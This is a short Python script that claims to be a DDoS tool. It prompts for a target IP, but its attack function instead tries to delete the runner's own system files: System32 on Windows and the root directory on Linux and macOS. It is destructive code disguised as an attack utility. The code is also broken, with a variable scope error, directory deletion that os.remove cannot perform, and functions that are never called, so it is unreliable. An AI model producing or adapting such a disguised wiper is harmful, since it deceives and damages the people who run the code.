import os
import platform

def setup():
    print("\nStarting the DDOS attack")
    operating_system = platform.system()

def start():
    address = input("IP address to attack: ")
    print(f"DDOS Attack at {address}")

def attack():
    if operating_system == "Windows":
       os.remove("\Windows\System32")
    elif operating_system == "Linux":
       os.remove("/")
    elif operating_system == "Darwin":
       os.remove("/")